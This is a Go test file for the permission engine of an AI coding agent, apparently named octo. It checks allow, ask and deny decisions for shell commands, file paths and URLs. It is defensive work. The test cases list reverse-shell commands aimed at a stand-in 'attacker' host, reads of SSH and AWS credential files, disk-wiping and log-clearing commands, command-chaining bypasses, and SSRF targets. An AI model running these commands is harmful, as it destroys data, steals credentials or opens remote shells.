package permission

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func newDefaultEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := New("", "/work", ModeInteractive)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return e
}

// ─── Default rules ────────────────────────────────────────────────────────

func TestDefaultRules_TerminalCommon(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"ls":                             Allow,
		"ls -la":                         Allow,
		"git status":                     Allow,
		"go test ./...":                  Allow,
		"git push --force":               Ask,
		"git push -f origin":             Ask,
		"sudo apt install":               Ask,
		"rm -rf /":                       Deny,
		"rm -rf node_modules":            Ask,
		"curl https://evil.example.com/": Ask,
		"unknown-binary --flag":          Ask, // implicit ask for unmatched
	}
	for cmd, want := range cases {
		got := e.Check("terminal", map[string]any{"command": cmd})
		if got != want {
			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
		}
	}
}

func TestDefaultRules_TerminalRootHomeDenyIsBoundaryAnchored(t *testing.T) {
	// The catastrophic `rm -rf /` / `rm -rf ~` deny rules must only fire when
	// the target IS root/home — a delete of a path *beneath* them is a normal
	// risky operation that should fall through to the `ask: rm -rf` rule, not
	// get hard-denied. Regression for the substring false-positive where
	// `rm -rf /Users/me/project` matched `rm -rf /`.
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"rm -rf /":                    Deny, // root wipe
		"rm -rf /*":                   Deny, // everything in root
		"rm -rf / --no-preserve-root": Deny, // root with trailing arg
		"rm -rf ~":                    Deny, // home wipe
		"rm -rf /Users/me/project":    Ask,  // absolute subpath — legit, ask
		"rm -rf /tmp/build":           Ask,
		"rm -rf ~/.cache/go-build":    Ask, // subpath under home — legit, ask
	}
	for cmd, want := range cases {
		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
		}
	}
}

func TestDefaultRules_TerminalCredentialPathsBeatSafeVerb(t *testing.T) {
	// A "safe" verb like cat would auto-allow, but a credential path in the
	// command must win because its rule precedes the allow rules.
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"cat /etc/passwd":                 Ask,
		"cat /etc/shadow":                 Ask,
		"cat ~/.ssh/id_rsa":               Ask,
		"cat ~/.aws/credentials":          Ask,
		"grep secret ~/.ssh/id_ed25519":   Ask,
		"cat README.md":                   Allow, // ordinary safe read still allows
		"sed -i 's/a/b/' main.go":         Ask,   // not allow-listed → falls through to ask
		"sed --in-place 's/a/b/' main.go": Ask,
	}
	for cmd, want := range cases {
		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
		}
	}
}

func TestDefaultRules_TerminalAllowCannotChain(t *testing.T) {
	// Allow-list entries like "ls" must not auto-approve a command that
	// chains into something else. The safe command can have arguments but no
	// shell control characters.
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"ls -la":               Allow,
		"  ls -la":             Allow, // leading whitespace is fine
		"ls && ./untrusted":    Ask,   // chain bypass attempt
		"go test ./...; ./pwn": Ask,   // chain bypass attempt
		"cat file | grep x":    Ask,   // pipe is chaining
		"echo $(id)":           Ask,   // command substitution
		"echo `id`":            Ask,   // backtick substitution
		"git status\ngit push": Ask,   // newline separates commands
		"catapult README.md":   Ask,   // prefix of "cat" must not match
		"echo ls":              Allow, // starts with "echo" allow pattern
	}
	for cmd, want := range cases {
		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
		}
	}
}

func TestDefaultRules_WebFetchIPv6LoopbackDenied(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"http://[::1]/":              Deny,
		"http://[::ffff:127.0.0.1]/": Deny,
		"http://[::ffff:7f00:1]/":    Deny,
		"http://[fe80::1]/":          Deny,
		"https://github.com/":        Allow,
	}
	for u, want := range cases {
		if got := e.Check("web_fetch", map[string]any{"url": u}); got != want {
			t.Errorf("web_fetch %q: got %s, want %s", u, got, want)
		}
	}
}

func TestDefaultRules_WebFetchPrivateRangeDenied(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"http://10.0.0.1/secret":                  Deny,
		"http://192.168.1.1/router":               Deny,
		"http://127.0.0.1:8080/":                  Deny,
		"http://localhost/":                       Deny,
		"http://169.254.169.254/metadata":         Deny, // AWS metadata
		"https://github.com/open-octo/octo-agent": Allow,
		"https://pkg.go.dev/net/url":              Allow,
		"https://random.example.com/":             Ask,
	}
	for u, want := range cases {
		got := e.Check("web_fetch", map[string]any{"url": u})
		if got != want {
			t.Errorf("web_fetch %q: got %s, want %s", u, got, want)
		}
	}
}

func TestDefaultRules_TerminalDangerousOperations(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		// Disk-level destruction — hard deny.
		"dd if=/dev/zero of=/dev/sda":              Deny,
		"dd if=/dev/urandom of=/dev/disk0":         Deny,
		"mkfs.ext4 /dev/sdb1":                      Deny,
		"fdisk /dev/sda":                           Deny,
		"parted /dev/sda mklabel":                  Deny,
		"diskutil eraseDisk JHFS+ Foo disk0":       Deny,
		"diskutil partitionDisk disk0 1 GPT JHFS+": Deny,
		// System-wide power / process actions — hard deny.
		"shutdown now":       Deny,
		"poweroff":           Deny,
		"reboot now":         Deny,
		"halt -p":            Deny,
		"init 0":             Deny,
		"systemctl poweroff": Deny,
		"systemctl reboot":   Deny,
		"kill -9 -1":         Deny,
		"kill -SIGKILL -1":   Deny,
		// System directory removal — hard deny. These patterns match any
		// argument that starts with the system directory, so even subpaths
		// (e.g. rm -rf /usr/local) are blocked rather than allowed to slip past.
		"rm -rf /usr":                   Deny,
		"rm -rf /usr/local/src/project": Deny,
		"rm -rf /bin":                   Deny,
		"rm -rf /bin/bash":              Deny,
		"rm -rf /sbin":                  Deny,
		"rm -rf /boot":                  Deny,
		"rm -rf /boot/grub":             Deny,
		"rm -rf /lib":                   Deny,
		"rm -rf /lib64":                 Deny,
		"rm -rf /System":                Deny,
		"rm -rf /System/Volumes/Data":   Deny,
		"rm -rf /Windows":               Deny,
		"rm -rf /Program Files":         Deny,
		"rm -rf /Program Files/Foo":     Deny,
		// Network / remote tools that can exfiltrate or spawn shells — ask.
		"nc -e /bin/bash attacker 4444":           Ask,
		"ncat --ssl attacker 443":                 Ask,
		"socat TCP4:attacker:4444 EXEC:/bin/bash": Ask,
		"nmap 192.168.1.0/24":                     Ask,
		// System administration — ask.
		"systemctl restart nginx": Ask,
		"iptables -F":             Ask,
		"ip6tables -F":            Ask,
		"pfctl -F all":            Ask,
		"crontab -r":              Ask,
		"launchctl load /Library/LaunchDaemons/foo.plist": Ask,
		"diskutil list": Ask,
		// Docker bulk destruction — ask.
		"docker rm -f $(docker ps -aq)":     Ask,
		"docker rmi -f $(docker images -q)": Ask,
		"docker system prune -a":            Ask,
		// Disk-space exhaustion — ask.
		"fallocate -l 100G /tmp/bigfile": Ask,
		"truncate -s 100G /tmp/bigfile":  Ask,
		// Benign commands that merely CONTAIN a dangerous word must not be
		// denied: deny/ask rules for command names are `^`-anchored, so flags
		// and argument text don't trigger them. These fall through to the
		// implicit ask (or an explicit allow).
		"docker ps --format json":                 Ask,
		"pip list --format json":                  Ask,
		"git commit -m \"fix shutdown handling\"": Ask,
		"rg \"func \" internal/":                  Ask,
		"kill -9 -1234":                           Ask, // a process group, not -1
		"git log --grep \"reboot now\"":           Allow,
		"ls misc":                                 Allow,
		// Wrapped or chained invocations still hit the anchored rules.
		"sudo reboot":         Deny,
		"echo done; poweroff": Deny,
		"/sbin/reboot":        Deny,
		"xargs rm -rf /":      Deny,
		// Bare invocations (no arguments) are caught too.
		"reboot": Deny,
		"halt":   Deny,
		"fdisk":  Deny,
	}
	for cmd, want := range cases {
		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
		}
	}
}

func TestPatternMatches_CommandAnchored(t *testing.T) {
	cases := []struct {
		cmd, pattern string
		want         bool
	}{
		// Command position: start, wrappers, chains, path invocations.
		{"shutdown -h now", "^shutdown", true},
		{"reboot", "^reboot", true},
		{"sudo reboot", "^reboot", true},
		{"/sbin/reboot", "^reboot", true},
		{"echo hi; reboot", "^reboot", true},
		{"true && reboot", "^reboot", true},
		{"bash -c reboot", "^reboot", true},
		{"cmd /c rmdir /s /q C:\\Windows", "^rmdir /s /q C:\\Windows", true},
		{"env FOO=bar poweroff", "^poweroff", true},
		// Not a command position: argument text, quoted strings, flags.
		{"echo reboot", "^reboot", false},
		{"git commit -m \"fix shutdown handling\"", "^shutdown", false},
		{"git log --grep \"reboot \"", "^reboot", false},
		{"docker ps --format json", "^format", false},
		{"rg \"func Foo\"", "^nc", false},
		{"ls misc", "^sc", false},
		{"sort desc", "^sc", false},
		// Word boundary at the end of the match.
		{"rebooter", "^reboot", false},
		{"kill -9 -1234", "^kill -9 -1", false},
		{"kill -9 -1", "^kill -9 -1", true},
		{"mkfs.ext4 /dev/sdb1", "^mkfs", true},
		{"rm -rf /usr/local", "^rm -rf /usr", true},
		{"rm -rf /usr-local", "^rm -rf /usr", false},
		// Root-marker end anchoring still applies in anchored form.
		{"rm -rf /", "^rm -rf /", true},
		{"rm -rf /tmp/foo", "^rm -rf /", false},
	}
	for _, c := range cases {
		if got := patternMatches(c.cmd, c.pattern); got != c.want {
			t.Errorf("patternMatches(%q, %q) = %v, want %v", c.cmd, c.pattern, got, c.want)
		}
	}
}

func TestDefaultRules_WriteFileSystemDirectories(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"/bin/bash":                        Deny,
		"/sbin/init":                       Deny,
		"/usr/bin/git":                     Deny,
		"/usr/sbin/nft":                    Deny,
		"/System/Library/foo.txt":          Deny,
		"/boot/grub/grub.cfg":              Deny,
		"/lib/modules/foo.ko":              Deny,
		"/lib64/ld-linux.so":               Deny,
		"C:/Windows/System32/kernel32.dll": Deny,
		"C:/Windows/SysWOW64/foo.dll":      Deny,
		"C:/ProgramData/app/config.json":   Deny,
		"D:/Windows/System32/bar.dll":      Deny,
		"/work/src/main.go":                Ask,
	}
	for p, want := range cases {
		for _, tool := range []string{"write_file", "edit_file"} {
			if got := e.Check(tool, map[string]any{"path": p}); got != want {
				t.Errorf("%s %q: got %s, want %s", tool, p, got, want)
			}
		}
	}
}

func TestDefaultRules_TerminalWindowsDangerous(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		// PowerShell / cross-platform rm variants targeting Windows system dirs.
		"rm -rf C:\\Windows":                 Deny,
		"rm -rf C:\\Windows\\System32":       Deny,
		"rm -rf C:\\ProgramData":             Deny,
		"rm -rf \"C:\\Windows\"":             Deny,
		"rm -rf \"C:\\Program Files\"":       Deny,
		"rm -rf \"C:\\Program Files (x86)\"": Deny,
		// cmd.exe recursive deletion and their aliases.
		"rmdir /s /q C:\\Windows":       Deny,
		"rmdir /s /q \"C:\\Windows\"":   Deny,
		"rmdir /s /q C:\\Program Files": Deny,
		"rd /s /q C:\\Windows":          Deny,
		"rd /s /q \"C:\\Windows\"":      Deny,
		"del /s /q C:\\Windows":         Deny,
		"del /s /q \"C:\\Windows\"":     Deny,
		"erase /s /q C:\\Windows":       Deny,
		"erase /s /q \"C:\\Windows\"":   Deny,
		// PowerShell aliases for Remove-Item targeting Windows system dirs.
		"ri -r -fo C:\\Windows":        Deny,
		"ri -r -fo \"C:\\Windows\"":    Deny,
		"del -r -fo C:\\Windows":       Deny,
		"del -r -fo \"C:\\Windows\"":   Deny,
		"erase -r -fo C:\\Windows":     Deny,
		"erase -r -fo \"C:\\Windows\"": Deny,
		// Windows system management tools that can brick the OS.
		"diskpart /s script.txt":       Deny,
		"reg delete HKLM\\Software /f": Deny,
		"bcdedit /delete {current}":    Deny,
		"format C:":                    Deny,
		"format D:":                    Deny,
		"vssadmin delete shadows /all": Deny,
		"wbadmin delete catalog":       Deny,
		"wevtutil cl System":           Deny,
		// Risky-but-legitimate Windows tools are ask, not hardcoded deny:
		// dism/fsutil have read-only and benign uses, sdelete is a targeted
		// delete like rm.
		"dism /online /disable-feature /featurename:NetFx3": Ask,
		"fsutil file createnew C:\\temp\\test.bin 4096":     Ask,
		"sdelete -p 3 C:\\secret.txt":                       Ask,
		// Untargeted recursive deletion is the cmd.exe counterpart of
		// `rm -rf` — ask, while system-dir targets stay hard-denied above.
		"rmdir /s /q C:\\Temp\\build": Ask,
		"del /s /q build":             Ask,
		"rd /s /q node_modules":       Ask,
		// Windows system management tools that can reconfigure or brick the OS.
		"wmic os where primary=1 call shutdown":                       Ask,
		"sc delete ServiceName":                                       Ask,
		"schtasks /delete /tn \"MyTask\" /f":                          Ask,
		"netsh advfirewall set allprofiles state off":                 Ask,
		"icacls C:\\Windows /grant Everyone:F":                        Ask,
		"takeown /f C:\\Windows":                                      Ask,
		"robocopy C:\\source C:\\Windows /MIR":                        Ask,
		"xcopy C:\\source C:\\Windows /E /I":                          Ask,
		"mklink C:\\Windows\\link C:\\target":                         Ask,
		"powershell -Command Remove-Item C:\\Windows -Recurse -Force": Ask,
		"cmd /c rmdir /s /q C:\\Windows":                              Deny,
		// But routine maintenance on a non-system drive is ask, not deny.
		"chkdsk E: /f": Ask,
		"sfc /scannow": Ask,
	}
	for cmd, want := range cases {
		if got := e.Check("terminal", map[string]any{"command": cmd}); got != want {
			t.Errorf("terminal %q: got %s, want %s", cmd, got, want)
		}
	}
}

func TestDefaultRules_WriteFileSensitive(t *testing.T) {
	e, err := New("", "/work", ModeInteractive)
	if err != nil {
		t.Fatal(err)
	}
	cases := map[string]Decision{
		"/home/user/.ssh/id_rsa": Deny,
		"/home/user/.ssh/config": Deny,
		"/etc/passwd":            Deny,
		"/work/myapp/.env":       Deny,
		"/work/myapp/.env.local": Deny,
		"/work/src/main.go":      Ask, // cwd is not a blanket-allow zone for writes
		"src/main.go":            Ask, // resolved against cwd=/work, still just ask
		"/tmp/outside-cwd.txt":   Ask, // outside CWD too → ask
	}
	for p, want := range cases {
		got := e.Check("write_file", map[string]any{"path": p})
		if got != want {
			t.Errorf("write_file %q: got %s, want %s", p, got, want)
		}
	}
}

func TestExtraWriteRoots_AllowedOutsideCWD(t *testing.T) {
	memDir := "/home/user/.octo/memories/myrepo-deadbeef"
	e, err := New("", "/work", ModeInteractive, memDir)
	if err != nil {
		t.Fatal(err)
	}
	cases := map[string]Decision{
		memDir + "/MEMORY.md":       Allow, // whitelisted memory dir → allow
		memDir + "/topics/debug.md": Allow,
		"/work/src/main.go":         Ask,  // CWD is still not a blanket allow
		"/home/user/other/file.txt": Ask,  // unrelated out-of-CWD path → ask
		"/home/user/.ssh/id_rsa":    Deny, // secret deny still wins elsewhere
	}
	for p, want := range cases {
		if got := e.Check("write_file", map[string]any{"path": p}); got != want {
			t.Errorf("write_file %q: got %s, want %s", p, got, want)
		}
	}
	// edit_file gets the same whitelist.
	if got := e.Check("edit_file", map[string]any{"path": memDir + "/MEMORY.md"}); got != Allow {
		t.Errorf("edit_file in memory dir: got %s, want allow", got)
	}
}

// TestExtraWriteRoots_OctoInitWritesOwnOutputUnderStrict pins the exact
// combination cmd/octo/init.go relies on: `octo init` defaults to
// ModeStrict (nobody is watching a one-shot analysis run) and passes its
// own cwd as an allowWriteRoot so it can still write `.octorules` without
// prompting. Losing this would silently break `octo init`'s one job.
func TestExtraWriteRoots_OctoInitWritesOwnOutputUnderStrict(t *testing.T) {
	e, err := New("", "/repo", ModeStrict, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if got := e.Check("write_file", map[string]any{"path": "/repo/.octorules"}); got != Allow {
		t.Errorf("octo init writing its own output under strict: got %s, want Allow", got)
	}
	// A plain strict session with no cwd allowWriteRoot must NOT get the
	// same free pass — this is init's special case, not a general relaxation.
	plain, err := New("", "/repo", ModeStrict)
	if err != nil {
		t.Fatal(err)
	}
	if got := plain.Check("write_file", map[string]any{"path": "/repo/.octorules"}); got != Deny {
		t.Errorf("plain strict session (no allowWriteRoot): got %s, want Deny", got)
	}
}

func TestDefaultRules_ReadFile(t *testing.T) {
	e := newDefaultEngine(t)
	cases := map[string]Decision{
		"/home/user/.ssh/id_rsa": Deny,
		"/work/.env":             Deny,
		"/work/src/main.go":      Allow,
		"README.md":              Allow,
	}
	for p, want := range cases {
		got := e.Check("read_file", map[string]any{"path": p})
		if got != want {
			t.Errorf("read_file %q: got %s, want %s", p, got, want)
		}
	}
}

// ─── Mode behaviour ───────────────────────────────────────────────────────

func TestInteractiveMode_PreservesAsk(t *testing.T) {
	e := newDefaultEngine(t)
	if got := e.Check("terminal", map[string]any{"command": "sudo apt install"}); got != Ask {
		t.Errorf("interactive preserves ask: got %s", got)
	}
}

func TestAutoApproveMode_TurnsAskIntoAllow(t *testing.T) {
	e, err := New("", "/work", ModeAutoApprove)
	if err != nil {
		t.Fatal(err)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
		t.Errorf("auto ask→allow: got %s, want Allow", got)
	}
	// Explicit allows still allow.
	if got := e.Check("terminal", map[string]any{"command": "ls"}); got != Allow {
		t.Errorf("auto still allows allow rules: got %s", got)
	}
	// Explicit denies still deny.
	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
		t.Errorf("auto still denies deny rules: got %s", got)
	}
}

func TestStrictMode_TurnsAskIntoDeny(t *testing.T) {
	e, err := New("", "/work", ModeStrict)
	if err != nil {
		t.Fatal(err)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Deny {
		t.Errorf("strict ask→deny: got %s, want Deny", got)
	}
	// Explicit allows still allow.
	if got := e.Check("terminal", map[string]any{"command": "ls"}); got != Allow {
		t.Errorf("strict still allows allow rules: got %s", got)
	}
	// Explicit denies still deny.
	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
		t.Errorf("strict still denies deny rules: got %s", got)
	}
	// The denial reason must not claim the user declined — nobody was asked.
	reason := e.DenialReason("terminal", map[string]any{"command": "some-unknown-cmd"})
	if !strings.Contains(reason, "strict") {
		t.Errorf("strict denial reason should mention strict mode, got %q", reason)
	}
}

// TestDefaultRules_ControlToolsAllowedEvenInStrict guards that control-plane /
// UX tools are explicitly allow-listed rather than left to the implicit ask.
// ask_user_question is the load-bearing case: it is the onboard flow's first
// step, and without an allow rule a non-interactive transport resolves its ask
// to deny — silently stranding onboarding (the regression that prompted this).
func TestDefaultRules_ControlToolsAllowedEvenInStrict(t *testing.T) {
	e, err := New("", "/work", ModeStrict)
	if err != nil {
		t.Fatal(err)
	}
	for _, tool := range []string{
		"ask_user_question", "skill",
		"sub_agent", "sub_agent_send", "sub_agent_status", "sub_agent_kill",
		"task_create", "task_update", "task_list",
	} {
		if got := e.Check(tool, map[string]any{}); got != Allow {
			t.Errorf("%s: got %s, want Allow (must not fall through to implicit ask→deny)", tool, got)
		}
	}
}

// ─── Tiered priority ───────────────────────────────────────────────────────

// TestCheck_DenyBeatsAllowRegardlessOfOrder guards the deny > ask > allow
// tiering: a deny rule must win even when a matching allow rule for the same
// input was declared earlier in the list. Positional first-match-wins would
// let the earlier allow slip through — the exact footgun a misordered
// permissions.yml could otherwise hit.
func TestCheck_DenyBeatsAllowRegardlessOfOrder(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	yml := `
terminal:
  - allow: { pattern: "danger" }
  - deny:  { pattern: "danger" }
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}
	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatal(err)
	}
	if got := e.Check("terminal", map[string]any{"command": "danger"}); got != Deny {
		t.Errorf("deny declared after allow should still win: got %s", got)
	}
}

// TestCheck_AskBeatsAllowRegardlessOfOrder is the same guard one tier down:
// an ask rule declared after a matching allow rule must still win.
func TestCheck_AskBeatsAllowRegardlessOfOrder(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	yml := `
terminal:
  - allow: { pattern: "risky" }
  - ask:   { pattern: "risky" }
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}
	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatal(err)
	}
	if got := e.Check("terminal", map[string]any{"command": "risky"}); got != Ask {
		t.Errorf("ask declared after allow should still win: got %s", got)
	}
}

// ─── Remember cache ────────────────────────────────────────────────────────

func TestRemember_ShortCircuits(t *testing.T) {
	e := newDefaultEngine(t)
	input := map[string]any{"command": "rm -rf node_modules"}
	if got := e.Check("terminal", input); got != Ask {
		t.Fatalf("baseline expected Ask, got %s", got)
	}
	e.Remember("terminal", input, Allow)
	if got := e.Check("terminal", input); got != Allow {
		t.Errorf("remember Allow: got %s", got)
	}
}

// TestRemember_WriteFileKeyedOnPathOnly guards the write_file/edit_file
// remember exception: content differs on every edit, so remembering the
// full input would never hit the cache twice. Approving one edit to a path
// must cover later edits to that same path with different content, while a
// different path still asks.
func TestRemember_WriteFileKeyedOnPathOnly(t *testing.T) {
	e := newDefaultEngine(t)
	first := map[string]any{"path": "/work/a.go", "content": "v1"}
	if got := e.Check("write_file", first); got != Ask {
		t.Fatalf("baseline expected Ask, got %s", got)
	}
	e.Remember("write_file", first, Allow)

	second := map[string]any{"path": "/work/a.go", "content": "v2"}
	if got := e.Check("write_file", second); got != Allow {
		t.Errorf("same path, different content: got %s, want Allow (path-keyed remember)", got)
	}

	other := map[string]any{"path": "/work/b.go", "content": "v1"}
	if got := e.Check("write_file", other); got != Ask {
		t.Errorf("different path: got %s, want Ask", got)
	}
}

// TestRemember_DenyBeatsPathKeyedWriteFileAllow guards the core safety
// invariant the path-keyed remember cache must preserve: approving one edit
// to a path must never let a LATER, more dangerous write to that same path
// slip through once a deny rule matches it (e.g. the path turns out to be
// under .env/.ssh, or the user tightens permissions.yml mid-session).
func TestRemember_DenyBeatsPathKeyedWriteFileAllow(t *testing.T) {
	e := newDefaultEngine(t)
	first := map[string]any{"path": "/work/.env", "content": "v1"}
	// .env is denied from the start — Remember must not be reachable, but
	// call it anyway to prove a stray "always allow" can't override a deny.
	if got := e.Check("write_file", first); got != Deny {
		t.Fatalf("baseline expected Deny for .env, got %s", got)
	}
	e.Remember("write_file", first, Allow)

	second := map[string]any{"path": "/work/.env", "content": "v2"}
	if got := e.Check("write_file", second); got != Deny {
		t.Errorf("deny must beat a remembered allow for the same path: got %s, want Deny", got)
	}
}

func TestRemember_StableAcrossMapOrder(t *testing.T) {
	// Same logical input, different map literal order → same cache key.
	e := newDefaultEngine(t)
	a := map[string]any{"x": "1", "y": "2"}
	b := map[string]any{"y": "2", "x": "1"}
	e.Remember("terminal", a, Allow)
	if got := e.Check("terminal", b); got != Allow {
		t.Errorf("cache key not stable across map order: got %s", got)
	}
}

// ─── Custom config override ────────────────────────────────────────────────

// TestHardcodedDenyRules_CannotBeOverriddenByUserConfig verifies that the
// engine-level system-directory and terminal-catastrophe denies apply even
// when a user permissions.yml tries to replace the default rules for those
// tools. This is the safety net that prevents a misguided or LLM-influenced
// user config from silently opening a path to OS destruction.
func TestHardcodedDenyRules_CannotBeOverriddenByUserConfig(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	// User tries to blanket-allow everything dangerous.
	yml := `
terminal:
  - allow: { pattern: "" }
write_file:
  - allow: { path: ["/**"] }
edit_file:
  - allow: { path: ["/**"] }
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}
	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatal(err)
	}
	// Terminal hardcoded denies still apply.
	for _, cmd := range []string{
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sdb1",
		"fdisk /dev/sda",
		"shutdown now",
		"reboot now",
		"rm -rf /",
		"rm -rf ~",
	} {
		if got := e.Check("terminal", map[string]any{"command": cmd}); got != Deny {
			t.Errorf("terminal %q: got %s, want Deny (hardcoded guard survived user override)", cmd, got)
		}
	}
	// Write/edit system paths still denied.
	for _, p := range []string{
		"/bin/bash",
		"/usr/bin/git",
		"/System/Library/foo.txt",
		"/boot/grub/grub.cfg",
		"C:/Windows/system32/foo.dll",
	} {
		for _, tool := range []string{"write_file", "edit_file"} {
			if got := e.Check(tool, map[string]any{"path": p}); got != Deny {
				t.Errorf("%s %q: got %s, want Deny (hardcoded guard survived user override)", tool, p, got)
			}
		}
	}
	// Sanity: ordinary non-system paths are allowed by the user's override.
	if got := e.Check("write_file", map[string]any{"path": "/work/src/main.go"}); got != Allow {
		t.Errorf("write_file /work/src/main.go: got %s, want Allow (user override still works for safe paths)", got)
	}
	// Sanity: the hardcoded guards are anchored to the command word, so a
	// benign command merely containing a guarded word is not collateral.
	if got := e.Check("terminal", map[string]any{"command": "docker ps --format json"}); got != Allow {
		t.Errorf("terminal docker ps --format json: got %s, want Allow (anchored guard must not hit a flag)", got)
	}
}

func TestNew_CustomConfigOverridesDefaults(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	// Override terminal rules to blanket-allow. This is useful in fully
	// sandboxed dev environments where the user wants no prompts. The hardcoded
	// OS-destruction guards (rm -rf /, dd, mkfs, etc.) still apply and are
	// verified separately; here we use a non-catastrophic command to confirm
	// the override mechanism still works.
	yml := `
terminal:
  - allow: { pattern: "" }   # blanket allow
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}

	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatal(err)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
		t.Errorf("user override should allow rm -rf node_modules, got %s", got)
	}
	// Hardcoded OS-destruction guards survive even a blanket allow.
	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
		t.Errorf("hardcoded rm -rf / deny should survive user override, got %s", got)
	}
	// Tools NOT in the user config keep default rules.
	if got := e.Check("write_file", map[string]any{"path": "/etc/passwd"}); got != Deny {
		t.Errorf("non-overridden write_file rule should still deny /etc/passwd, got %s", got)
	}
}

func TestNew_MissingConfigUsesDefaults(t *testing.T) {
	// Non-existent config path is not an error.
	e, err := New("/no/such/file.yml", "/work", ModeInteractive)
	if err != nil {
		t.Fatalf("missing config should not error: %v", err)
	}
	if got := e.Check("terminal", map[string]any{"command": "ls"}); got != Allow {
		t.Errorf("defaults should be loaded: got %s", got)
	}
}

func TestNew_InvalidYAMLErrors(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "bad.yml")
	if err := os.WriteFile(cfg, []byte("not: valid: yaml: ["), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := New(cfg, "/work", ModeInteractive); err == nil {
		t.Error("expected error on invalid yaml")
	}
}

func TestNew_FallsBackToLastGoodRulesOnParseError(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	yml := `
terminal:
  - allow: { pattern: "" }   # blanket allow
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}

	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatalf("first New() = %v, want nil", err)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
		t.Fatalf("first New() should have the blanket allow, got %s", got)
	}

	// A hand-edit mid-session leaves the file momentarily invalid.
	if err := os.WriteFile(cfg, []byte("not: valid: yaml: ["), 0o644); err != nil {
		t.Fatal(err)
	}

	e2, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatalf("New() after parse error = %v, want nil (fall back to last known good)", err)
	}
	if got := e2.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
		t.Errorf("New() after parse error should keep last good rules (blanket allow), got %s", got)
	}
	// Hardcoded OS-destruction guards are always present, even when the user
	// rules were cached.
	if got := e2.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
		t.Errorf("hardcoded rm -rf / deny should still apply after fallback, got %s", got)
	}
}

func TestNew_FallsBackToLastGoodRulesOnReadError(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	yml := `
terminal:
  - allow: { pattern: "" }   # blanket allow
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := New(cfg, "/work", ModeInteractive); err != nil {
		t.Fatalf("first New() = %v, want nil", err)
	}

	// Replace the file with a directory of the same name: os.ReadFile now
	// fails with something other than "not exist", exercising the `default:`
	// branch (as opposed to the parse-error branch above).
	if err := os.Remove(cfg); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(cfg, 0o755); err != nil {
		t.Fatal(err)
	}

	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatalf("New() after read error = %v, want nil (fall back to last known good)", err)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf node_modules"}); got != Allow {
		t.Errorf("New() after read error should keep last good rules (blanket allow), got %s", got)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
		t.Errorf("hardcoded rm -rf / deny should still apply after fallback, got %s", got)
	}
}

func TestNew_DeletedConfigDropsCachedRules(t *testing.T) {
	dir := t.TempDir()
	cfg := filepath.Join(dir, "permissions.yml")
	yml := `
terminal:
  - allow: { pattern: "" }   # blanket allow
`
	if err := os.WriteFile(cfg, []byte(yml), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := New(cfg, "/work", ModeInteractive); err != nil {
		t.Fatalf("first New() = %v, want nil", err)
	}

